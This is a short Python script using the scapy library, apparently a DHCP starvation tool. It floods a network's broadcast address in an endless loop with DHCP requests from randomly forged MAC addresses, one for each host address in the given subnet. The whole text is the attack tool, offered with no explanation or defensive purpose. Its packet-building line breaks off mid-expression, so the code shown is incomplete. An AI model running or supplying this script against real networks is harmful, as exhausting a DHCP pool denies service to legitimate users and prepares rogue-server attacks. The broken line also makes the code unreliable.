import sys
from scapy.all import *

conf.checkIPaddr = False
server, network = sys.argv[1], sys.argv[2]
base = ".".join(network.split(".")[:3])

while True:
    for i in range(1, 254):
        mac = RandMAC()
        ip = f"{base}.{i}"
        sendp(Ether(dst="ff:ff:ff:ff:ff:ff", src=mac)/IP(src="0.0.0.0", dst="255.255.255.255")/UDP(sport=68, dport=67)/>
        print(f"[+] {ip} - {mac}")


